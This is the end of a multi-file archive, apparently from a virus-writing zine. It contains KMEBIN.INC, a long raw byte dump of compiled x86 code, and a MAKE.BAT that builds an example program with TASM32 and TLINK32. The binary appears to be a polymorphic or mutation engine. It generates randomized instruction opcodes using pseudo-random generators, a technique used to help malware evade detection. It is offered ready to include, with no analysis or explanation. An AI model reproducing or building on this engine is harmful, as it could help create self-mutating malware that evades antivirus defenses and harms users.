	db	0FFh,0FFh,0D1h,07Ch,09Dh,0CCh,066h,0B8h
	db	0D1h,0F8h,0E9h,091h,0FEh,0FFh,0FFh,0F7h
	db	045h,054h,010h,000h,000h,000h,00Fh,084h
	db	034h,0F8h,0FFh,0FFh,08Bh,044h,095h,0CCh
	db	031h,044h,09Dh,0CCh,0B0h,031h,0E9h,07Eh
	db	0FEh,0FFh,0FFh,0F7h,045h,054h,004h,000h
	db	000h,000h,00Fh,084h,018h,0F8h,0FFh,0FFh
	db	08Bh,044h,095h,0CCh,001h,044h,09Dh,0CCh
	db	0B0h,001h,0E9h,062h,0FEh,0FFh,0FFh,0F7h
	db	045h,054h,008h,000h,000h,000h,00Fh,084h
	db	0FCh,0F7h,0FFh,0FFh,08Bh,044h,095h,0CCh
	db	029h,044h,09Dh,0CCh,0B0h,029h,0E9h,046h
	db	0FEh,0FFh,0FFh,0F7h,045h,054h,001h,000h
	db	000h,000h,00Fh,084h,0E0h,0F7h,0FFh,0FFh
	db	08Bh,044h,095h,0CCh,089h,044h,09Dh,0CCh
	db	0B0h,089h,0E9h,02Ah,0FEh,0FFh,0FFh,0F7h
	db	045h,054h,002h,000h,000h,000h,00Fh,084h
	db	0C4h,0F7h,0FFh,0FFh,00Fh,0A3h,055h,0F0h
	db	00Fh,082h,069h,0F9h,0FFh,0FFh,08Bh,044h
	db	09Dh,0CCh,087h,044h,095h,0CCh,089h,044h
	db	09Dh,0CCh,0B0h,087h,0E9h,00Ah,0FEh,0FFh
	db	0FFh,0F7h,045h,054h,000h,001h,000h,000h
	db	00Fh,084h,09Ah,0F7h,0FFh,0FFh,08Bh,044h
	db	095h,0CCh,021h,044h,09Dh,0CCh,0B0h,021h
	db	0E9h,0E4h,0FDh,0FFh,0FFh,0F7h,045h,054h
	db	080h,000h,000h,000h,00Fh,084h,07Eh,0F7h
	db	0FFh,0FFh,08Bh,044h,095h,0CCh,009h,044h
	db	09Dh,0CCh,0B0h,009h,0E9h,0C8h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,001h,000h,000h,000h
	db	00Fh,084h,062h,0F7h,0FFh,0FFh,089h,04Ch
	db	09Dh,0CCh,0B0h,0B8h,0E9h,0E4h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,004h,000h,000h,000h
	db	00Fh,084h,04Ah,0F7h,0FFh,0FFh,0B8h,081h
	db	0C0h,005h,000h,0E8h,089h,000h,000h,000h
	db	001h,04Ch,09Dh,0CCh,0E9h,0D4h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,008h,000h,000h,000h
	db	00Fh,084h,02Ah,0F7h,0FFh,0FFh,0B8h,081h
	db	0E8h,02Dh,000h,0E8h,069h,000h,000h,000h
	db	029h,04Ch,09Dh,0CCh,0E9h,0B4h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,010h,000h,000h,000h
	db	00Fh,084h,00Ah,0F7h,0FFh,0FFh,0B8h,081h
	db	0F0h,035h,000h,0E8h,049h,000h,000h,000h
	db	031h,04Ch,09Dh,0CCh,0E9h,094h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,000h,001h,000h,000h
	db	00Fh,084h,0EAh,0F6h,0FFh,0FFh,0B8h,081h
	db	0E0h,025h,000h,0E8h,029h,000h,000h,000h
	db	021h,04Ch,09Dh,0CCh,0E9h,074h,0FDh,0FFh
	db	0FFh,0F7h,045h,054h,080h,000h,000h,000h
	db	00Fh,084h,0CAh,0F6h,0FFh,0FFh,0B8h,081h
	db	0C8h,00Dh,000h,0E8h,009h,000h,000h,000h
	db	009h,04Ch,09Dh,0CCh,0E9h,054h,0FDh,0FFh
	db	0FFh,0F7h,045h,058h,020h,000h,000h,000h
	db	075h,00Ch,0E8h,0EAh,004h,000h,000h,074h
	db	005h,00Ch,002h,00Fh,0BEh,0C9h,0C3h,0F7h
	db	045h,054h,000h,008h,000h,000h,00Fh,084h
	db	094h,0F6h,0FFh,0FFh,0E8h,04Eh,0FDh,0FFh
	db	0FFh,0D3h,044h,09Dh,0CCh,066h,0B8h,0C1h
	db	0C0h,0E9h,035h,0FDh,0FFh,0FFh,0F7h,045h
	db	054h,000h,010h,000h,000h,00Fh,084h,075h
	db	0F6h,0FFh,0FFh,0E8h,02Fh,0FDh,0FFh,0FFh
	db	0D3h,04Ch,09Dh,0CCh,066h,0B8h,0C1h,0C8h
	db	0E9h,016h,0FDh,0FFh,0FFh,0F7h,045h,054h
	db	000h,000h,001h,000h,00Fh,084h,056h,0F6h
	db	0FFh,0FFh,08Bh,044h,09Dh,0CCh,00Fh,0AFh
	db	044h,095h,0CCh,089h,044h,09Dh,0CCh,066h
	db	0B8h,00Fh,0AFh,087h,0DAh,0E9h,09Eh,0FCh
	db	0FFh,0FFh,0F7h,045h,054h,000h,000h,001h
	db	000h,00Fh,084h,031h,0F6h,0FFh,0FFh,08Bh
	db	044h,095h,0CCh,00Fh,0AFh,0C1h,089h,044h
	db	09Dh,0CCh,0B0h,069h,087h,0DAh,0E9h,0A2h
	db	0FCh,0FFh,0FFh,0F7h,045h,054h,000h,000h
	db	002h,000h,00Fh,084h,010h,0F6h,0FFh,0FFh
	db	0E8h,0CAh,0FCh,0FFh,0FFh,08Bh,044h,095h
	db	0CCh,00Fh,0A5h,044h,09Dh,0CCh,066h,0B8h
	db	00Fh,0A4h,0E9h,075h,0FCh,0FFh,0FFh,0F7h
	db	045h,054h,000h,000h,004h,000h,00Fh,084h
	db	0ECh,0F5h,0FFh,0FFh,0E8h,0A6h,0FCh,0FFh
	db	0FFh,08Bh,044h,095h,0CCh,00Fh,0ADh,044h
	db	09Dh,0CCh,066h,0B8h,00Fh,0ACh,0E9h,051h
	db	0FCh,0FFh,0FFh,0F7h,045h,054h,000h,000h
	db	008h,000h,00Fh,084h,0C8h,0F5h,0FFh,0FFh
	db	0E8h,082h,0FCh,0FFh,0FFh,00Fh,0BBh,04Ch
	db	09Dh,0CCh,0B8h,00Fh,0BAh,0F8h,000h,0E9h
	db	07Dh,0FCh,0FFh,0FFh,0F7h,045h,054h,000h
	db	000h,010h,000h,00Fh,084h,0A7h,0F5h,0FFh
	db	0FFh,0E8h,061h,0FCh,0FFh,0FFh,00Fh,0B3h
	db	04Ch,09Dh,0CCh,0B8h,00Fh,0BAh,0F0h,000h
	db	0E9h,05Ch,0FCh,0FFh,0FFh,0F7h,045h,054h
	db	000h,000h,020h,000h,00Fh,084h,086h,0F5h
	db	0FFh,0FFh,0E8h,040h,0FCh,0FFh,0FFh,00Fh
	db	0ABh,04Ch,09Dh,0CCh,0B8h,00Fh,0BAh,0E8h
	db	000h,0E9h,03Bh,0FCh,0FFh,0FFh,0F7h,045h
	db	054h,000h,000h,040h,000h,00Fh,084h,065h
	db	0F5h,0FFh,0FFh,08Bh,044h,09Dh,0CCh,00Fh
	db	0C8h,089h,044h,09Dh,0CCh,066h,0B8h,00Fh
	db	0C8h,0E9h,0A2h,0FBh,0FFh,0FFh,0F7h,045h
	db	054h,000h,000h,080h,000h,00Fh,084h,045h
	db	0F5h,0FFh,0FFh,00Fh,0A3h,055h,0F0h,00Fh
	db	082h,0EAh,0F6h,0FFh,0FFh,08Bh,044h,09Dh
	db	0CCh,08Bh,04Ch,095h,0CCh,00Fh,0C1h,0C8h
	db	089h,044h,09Dh,0CCh,089h,04Ch,095h,0CCh
	db	066h,0B8h,00Fh,0C1h,0E9h,07Fh,0FBh,0FFh
	db	0FFh,0F7h,045h,054h,000h,000h,000h,002h
	db	00Fh,084h,012h,0F5h,0FFh,0FFh,08Bh,044h
	db	09Dh,0CCh,08Bh,04Ch,095h,0CCh,00Fh,0BDh
	db	0C1h,089h,044h,09Dh,0CCh,066h,0B8h,00Fh
	db	0BDh,087h,0DAh,0E9h,058h,0FBh,0FFh,0FFh
	db	0F7h,045h,054h,000h,000h,000h,004h,00Fh
	db	084h,0EBh,0F4h,0FFh,0FFh,08Bh,044h,09Dh
	db	0CCh,08Bh,04Ch,095h,0CCh,00Fh,0BCh,0C1h
	db	089h,044h,09Dh,0CCh,066h,0B8h,00Fh,0BCh
	db	087h,0DAh,0E9h,031h,0FBh,0FFh,0FFh,08Bh
	db	045h,04Ch,083h,0E0h,005h,083h,0F8h,005h
	db	075h,01Fh,08Bh,045h,0ECh,083h,0E0h,005h
	db	083h,0F8h,005h,075h,014h,0F7h,045h,0F0h
	db	005h,000h,000h,000h,075h,00Bh,08Bh,045h
	db	0CCh,08Bh,055h,0D4h,08Bh,04Ch,09Dh,0CCh
	db	0C3h,058h,0E9h,050h,0F6h,0FFh,0FFh,089h
	db	045h,0CCh,089h,055h,0D4h,0C3h,0F7h,045h
	db	054h,000h,000h,000h,008h,00Fh,084h,08Dh
	db	0F4h,0FFh,0FFh,0E8h,0B7h,0FFh,0FFh,0FFh
	db	0F7h,0E1h,0E8h,0E0h,0FFh,0FFh,0FFh,066h
	db	0B8h,0F7h,0E0h,0E9h,0C8h,0FAh,0FFh,0FFh
	db	0F7h,045h,054h,000h,000h,000h,010h,00Fh
	db	084h,06Bh,0F4h,0FFh,0FFh,0E8h,095h,0FFh
	db	0FFh,0FFh,0F7h,0E9h,0E8h,0BEh,0FFh,0FFh
	db	0FFh,066h,0B8h,0F7h,0E8h,0E9h,0A6h,0FAh
	db	0FFh,0FFh,0F7h,045h,054h,000h,000h,000h
	db	020h,00Fh,084h,049h,0F4h,0FFh,0FFh,0E8h
	db	073h,0FFh,0FFh,0FFh,00Bh,0C9h,00Fh,084h
	db	0EBh,0F5h,0FFh,0FFh,03Bh,0CAh,00Fh,086h
	db	0E3h,0F5h,0FFh,0FFh,0F7h,0F1h,0E8h,08Ch
	db	0FFh,0FFh,0FFh,0B8h,0F7h,0F0h,000h,000h
	db	0E9h,073h,0FAh,0FFh,0FFh,0F7h,045h,054h
	db	000h,000h,000h,020h,00Fh,084h,016h,0F4h
	db	0FFh,0FFh,0E8h,040h,0FFh,0FFh,0FFh,0E8h
	db	017h,000h,000h,000h,00Fh,082h,0B5h,0F5h
	db	0FFh,0FFh,0F7h,0F9h,0E8h,05Eh,0FFh,0FFh
	db	0FFh,0B8h,0F7h,0F8h,000h,000h,0E9h,045h
	db	0FAh,0FFh,0FFh,060h,00Bh,0C9h,0F9h,074h
	db	034h,07Fh,002h,0F7h,0D9h,00Bh,0D2h,07Dh
	db	007h,0F7h,0DAh,0F7h,0D8h,083h,0DAh,000h
	db	033h,0F6h,033h,0FFh,0B3h,040h,0D1h,0E6h
	db	072h,01Bh,0D1h,0E0h,0D1h,0D2h,0D1h,0D7h
	db	072h,004h,03Bh,0F9h,072h,005h,01Bh,0F9h
	db	083h,0CEh,001h,0FEh,0CBh,075h,0E7h,0D1h
	db	0E6h,072h,002h,0D1h,0E7h,061h,0C3h,0F7h
	db	045h,050h,000h,001h,000h,000h,00Fh,084h
	db	0ACh,0F3h,0FFh,0FFh,080h,07Dh,0BCh,000h
	db	00Fh,085h,051h,0F5h,0FFh,0FFh,080h,0BDh
	db	0DCh,0FEh,0FFh,0FFh,008h,00Fh,083h,044h
	db	0F5h,0FFh,0FFh,080h,0BDh,0E0h,0FEh,0FFh
	db	0FFh,000h,075h,01Eh,0FEh,085h,0E0h,0FEh
	db	0FFh,0FFh,066h,0B8h,09Bh,0DBh,066h,0ABh
	db	0B0h,0E3h,0AAh,09Bh,0DBh,0E3h,0C6h,085h
	db	0DCh,0FEh,0FFh,0FFh,000h,0E9h,01Dh,0F5h
	db	0FFh,0FFh,00Fh,0ABh,05Dh,0F0h,08Dh,042h
	db	050h,0AAh,0FFh,074h,095h,0CCh,0E8h,032h
	db	0F3h,0FFh,0FFh,0E8h,0D1h,000h,000h,000h
	db	033h,0F6h,080h,0BDh,0DCh,0FEh,0FFh,0FFh
	db	008h,073h,007h,0E8h,089h,001h,000h,000h
	db	075h,05Dh,0E8h,072h,001h,000h,000h,048h
	db	074h,00Bh,048h,074h,010h,066h,0B8h,0D9h
	db	0FEh,0D9h,0FEh,0EBh,00Eh,066h,0B8h,0D9h
	db	0FFh,0D9h,0FFh,0EBh,006h,066h,0B8h,0D9h
	db	0FAh,0D9h,0FAh,066h,0ABh,0E8h,0F3h,0F2h
	db	0FFh,0FFh,0E8h,0C1h,000h,000h,000h,0E8h
	db	096h,0F2h,0FFh,0FFh,08Dh,043h,058h,0AAh
	db	08Fh,044h,09Dh,0CCh,00Fh,0B3h,05Dh,0F0h
	db	00Bh,0F6h,074h,016h,0E8h,0D4h,0F2h,0FFh
	db	0FFh,0E8h,07Ch,0F2h,0FFh,0FFh,066h,0B8h
	db	083h,0C4h,066h,0ABh,0B0h,004h,0AAh,083h
	db	0C4h,004h,0E9h,098h,0F4h,0FFh,0FFh,046h
	db	08Dh,043h,050h,0AAh,0FFh,074h,09Dh,0CCh
	db	0E8h,0B0h,0F2h,0FFh,0FFh,0E8h,04Fh,000h
	db	000h,000h,0B8h,006h,000h,000h,000h,0E8h
	db	0F6h,000h,000h,000h,048h,074h,01Ah,048h
	db	074h,01Fh,048h,074h,024h,048h,074h,029h
	db	048h,074h,02Eh,066h,0B8h,0DEh,0C1h,0DEh
	db	0C1h,0FEh,08Dh,0DCh,0FEh,0FFh,0FFh,0EBh
	db	08Ah,066h,0B8h,0DEh,0E9h,0DEh,0E9h,0EBh
	db	0F0h,066h,0B8h,0DEh,0E1h,0DEh,0E1h,0EBh
	db	0E8h,066h,0B8h,0DEh,0C9h,0DEh,0C9h,0EBh
	db	0E0h,066h,0B8h,0DEh,0F9h,0DEh,0F9h,0EBh
	db	0D8h,066h,0B8h,0DEh,0F1h,0DEh,0F1h,0EBh
	db	0D0h,0E8h,004h,0F2h,0FFh,0FFh,0E8h,0BEh
	db	000h,000h,000h,074h,00Ah,066h,0B8h,0DBh
	db	004h,0DBh,044h,024h,004h,0EBh,008h,066h
	db	0B8h,0D9h,004h,0D9h,044h,024h,004h,066h
	db	0ABh,0B0h,024h,0AAh,0FEh,085h,0DCh,0FEh
	db	0FFh,0FFh,0E8h,02Eh,0F2h,0FFh,0FFh,0C3h
	db	0E8h,0D5h,0F1h,0FFh,0FFh,0E8h,08Fh,000h
	db	000h,000h,074h,00Ah,066h,0B8h,0D9h,01Ch
	db	0D9h,05Ch,024h,004h,0EBh,008h,066h,0B8h
	db	0DBh,01Ch,0DBh,05Ch,024h,004h,066h,0ABh
	db	0B0h,024h,0AAh,0FEh,08Dh,0DCh,0FEh,0FFh
	db	0FFh,0E8h,0FFh,0F1h,0FFh,0FFh,0C3h,08Bh
	db	045h,010h,069h,0C0h,0FDh,043h,003h,000h
	db	005h,0C3h,09Eh,026h,000h,089h,045h,010h
	db	08Bh,085h,0D4h,0FEh,0FFh,0FFh,069h,0C0h
	db	005h,084h,008h,008h,040h,089h,085h,0D4h
	db	0FEh,0FFh,0FFh,033h,045h,010h,0C3h,051h
	db	052h,0E8h,0D1h,0FFh,0FFh,0FFh,08Bh,04Ch
	db	024h,00Ch,081h,0F9h,000h,000h,001h,000h
	db	073h,010h,0C1h,0E8h,010h,00Fh,0AFh,0C1h
	db	0C1h,0E8h,010h,05Ah,059h,085h,0C0h,0C2h
	db	004h,000h,033h,0D2h,0F7h,0F1h,08Bh,0C2h
	db	0EBh,0F1h,050h,0E8h,0CFh,0FFh,0FFh,0FFh
	db	0C3h,06Ah,003h,0E8h,0C7h,0FFh,0FFh,0FFh
	db	0C3h,06Ah,002h,0E8h,0BFh,0FFh,0FFh,0FFh
	db	0C3h,050h,0E8h,0F2h,0FFh,0FFh,0FFh,058h
	db	0C3h,06Ah,008h,0E8h,0AFh,0FFh,0FFh,0FFh
	db	0C3h,068h,000h,001h,000h,000h,0E8h,0A4h
	db	0FFh,0FFh,0FFh,0C3h,050h,0E8h,0EFh,0FFh
	db	0FFh,0FFh,088h,004h,024h,0E8h,0E7h,0FFh
	db	0FFh,0FFh,088h,044h,024h,001h,0E8h,0DEh
	db	0FFh,0FFh,0FFh,088h,044h,024h,002h,0E8h
	db	0D5h,0FFh,0FFh,0FFh,088h,044h,024h,003h
	db	058h,085h,0C0h,0C3h,08Bh,045h,00Ch,083h
	db	0F8h,002h,07Dh,012h,083h,0F8h,0FEh,07Eh
	db	005h,0E9h,0DCh,0EBh,0FFh,0FFh,0F7h,0D8h
	db	0E8h,08Dh,0FFh,0FFh,0FFh,040h,093h,0C7h
	db	085h,0CCh,0FEh,0FFh,0FFh,000h,000h,000h
	db	000h,08Bh,07Dh,008h,00Bh,0FFh,00Fh,084h
	db	0BEh,0EBh,0FFh,0FFh,08Bh,075h,028h,08Bh
	db	04Dh,02Ch,089h,08Dh,0C4h,0FEh,0FFh,0FFh
	db	0F3h,0A4h,0FFh,075h,030h,08Fh,085h,0C8h
	db	0FEh,0FFh,0FFh,033h,0D2h,042h,0FFh,075h
	db	058h,03Bh,0D3h,074h,007h,081h,024h,024h
	db	0FFh,0F9h,0FFh,0FFh,0FFh,075h,054h,0FFh
	db	075h,050h,0FFh,075h,04Ch,0FFh,075h,048h
	db	0FFh,075h,044h,08Bh,04Dh,040h,00Bh,0C9h
	db	075h,009h,08Dh,08Dh,0D0h,0FEh,0FFh,0FFh
	db	089h,04Dh,040h,051h,0FFh,075h,03Ch,0FFh
	db	075h,038h,0FFh,075h,034h,0FFh,0B5h,0C8h
	db	0FEh,0FFh,0FFh,0FFh,0B5h,0C4h,0FEh,0FFh
	db	0FFh,0FFh,075h,008h,0FFh,075h,024h,03Bh
	db	0D3h,074h,003h,058h,06Ah,000h,0FFh,075h
	db	020h,083h,0FAh,001h,074h,003h,058h,06Ah
	db	000h,0FFh,075h,01Ch,0FFh,075h,018h,0FFh
	db	075h,014h,03Bh,0D3h,074h,003h,058h,06Ah
	db	000h,0E8h,01Eh,0FFh,0FFh,0FFh,050h,06Ah
	db	001h,06Ah,000h,0E8h,018h,0E9h,0FFh,0FFh
	db	083h,0C4h,054h,083h,0F8h,0FEh,075h,015h
	db	083h,0FAh,001h,074h,010h,08Bh,04Dh,00Ch
	db	00Bh,0C9h,07Ch,064h,0F7h,045h,058h,000h
	db	020h,000h,000h,074h,05Bh,083h,0F8h,001h
	db	00Fh,085h,009h,0EBh,0FFh,0FFh,03Bh,0D3h
	db	00Fh,084h,0C3h,0EAh,0FFh,0FFh,08Bh,075h
	db	034h,08Bh,07Dh,008h,08Bh,04Dh,040h,08Bh
	db	009h,089h,08Dh,0C4h,0FEh,0FFh,0FFh,0F3h
	db	0A4h,08Bh,04Dh,044h,0E3h,002h,08Bh,009h
	db	089h,08Dh,0C8h,0FEh,0FFh,0FFh,0E9h,032h
	db	0FFh,0FFh,0FFh,08Bh,075h,008h,08Bh,07Dh
	db	034h,08Bh,045h,040h,08Bh,08Dh,0C4h,0FEh
	db	0FFh,0FFh,089h,008h,0F3h,0A4h,08Bh,04Dh
	db	044h,0E3h,008h,08Bh,085h,0C8h,0FEh,0FFh
	db	0FFh,089h,001h,0E9h,079h,0EAh,0FFh,0FFh
	db	083h,0BDh,0CCh,0FEh,0FFh,0FFh,000h,00Fh
	db	085h,097h,0EAh,0FFh,0FFh,0FFh,085h,0CCh
	db	0FEh,0FFh,0FFh,08Dh,05Ah,0FFh,0E9h,0CEh
	db	0FEh,0FFh,0FFh
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[KMEBIN.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
tasm32.exe /s /m /ml /z examplo.asm
tlink32.exe -x -c -Tpe examplo.obj,,,import32.lib
del examplo.obj
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
